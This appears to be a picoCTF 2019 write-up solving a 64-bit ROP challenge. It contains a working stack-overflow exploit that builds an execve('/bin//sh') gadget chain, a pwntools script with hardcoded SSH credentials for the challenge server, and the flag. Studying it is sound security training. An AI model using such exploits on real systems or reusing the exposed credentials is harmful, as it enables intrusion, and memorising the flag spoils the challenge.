# Problem
Time for the classic ROP in 64-bit. Can you exploit this program to get a flag? You can find the [program](https://2019shell1.picoctf.com/static/1b9bcb020357a3d33cf91a1e89e9b54b/vuln) in /problems/rop64_0_4c66bec7dba72276ffa01e0ad2d6ec8f on the shell server. [Source](https://2019shell1.picoctf.com/static/1b9bcb020357a3d33cf91a1e89e9b54b/vuln.c).

## Hints:

This is a classic 64-bit OP to get a shell

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/1b9bcb020357a3d33cf91a1e89e9b54b/vuln
wget https://2019shell1.picoctf.com/static/1b9bcb020357a3d33cf91a1e89e9b54b/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("Can you ROP your way out of this?\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

Same code, but this time 64bit.

```bash
roee@Roee-Ubuntu:~/CTFs-Writeups/picoCTF-2019/Binary/rop32-400$ checksec ./vuln

[*] '/home/roee/CTFs-Writeups/picoCTF-2019/Binary/rop64-400/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The ```vuln()``` function is exploitable. We just need to override the return address and execute some shellcode.

First we need to check the offset overriding the return address. We can use this gdbinit script
```
run < <(echo AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVV)
```

Lets debug:
```bash
gdb -x ./gdbinit ./vuln

Stopped reason: SIGSEGV
0x0000000000400b6e in vuln ()
$1 = (void *) 0x4343434343434343
```

We know that ```DDDDDDDD``` overrides the return address.

### Method 1 - Using automatic tools
We will use [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).

```bash
python ../../../tools/ROPgadget/ROPgadget.py --binary ./vuln --ropchain --badbytes "0a|0d"

...
Unique gadgets found: 10919

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

  [+] Gadget found: 0x47f561 mov qword ptr [rsi], rax ; ret
  [+] Gadget found: 0x4100d3 pop rsi ; ret
  [+] Gadget found: 0x4156f4 pop rax ; ret
  [+] Gadget found: 0x444c50 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

  [+] Gadget found: 0x444c50 xor rax, rax ; ret
  [+] Gadget found: 0x4749c0 add rax, 1 ; ret
  [+] Gadget found: 0x4749c1 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

  [+] Gadget found: 0x400686 pop rdi ; ret
  [+] Gadget found: 0x4100d3 pop rsi ; ret
  [+] Gadget found: 0x4499b5 pop rdx ; ret

- Step 4 -- Syscall gadget

  [+] Gadget found: 0x47b6ff syscall

- Step 5 -- Build the ROP chain

  #!/usr/bin/env python2
  # execve generated by ROPgadget

  from struct import pack

  # Padding goes here
  p = ''

  p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
  p += pack('<Q', 0x00000000006b90e0) # @ .data
  p += pack('<Q', 0x00000000004156f4) # pop rax ; ret
  p += '/bin//sh'
  p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
  p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
  p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
  p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
  p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
  p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
  p += pack('<Q', 0x00000000006b90e0) # @ .data
  p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
  p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
  p += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
  p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
  p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
  p += pack('<Q', 0x000000000047b6ff) # syscall
```

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *
from struct import pack

# Padding goes here
ropchain = ''

ropchain += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
ropchain += pack('<Q', 0x00000000006b90e0) # @ .data
ropchain += pack('<Q', 0x00000000004156f4) # pop rax ; ret
ropchain += '/bin//sh'
ropchain += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
ropchain += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
ropchain += pack('<Q', 0x00000000006b90e8) # @ .data + 8
ropchain += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
ropchain += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
ropchain += pack('<Q', 0x0000000000400686) # pop rdi ; ret
ropchain += pack('<Q', 0x00000000006b90e0) # @ .data
ropchain += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
ropchain += pack('<Q', 0x00000000006b90e8) # @ .data + 8
ropchain += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
ropchain += pack('<Q', 0x00000000006b90e8) # @ .data + 8
ropchain += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x000000000047b6ff) # syscall


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/rop64_0_4c66bec7dba72276ffa01e0ad2d6ec8f')
  p = s.process('./vuln')

binary = ELF('./vuln')

print p.recvuntil('Can you ROP your way out of this?\n')
p.sendline('AAAAAAAABBBBBBBBCCCCCCCC' + ropchain)
p.sendline('cat flag.txt')
p.sendline('exit')

print p.recvall()
```

Flag: picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_d4b7a298}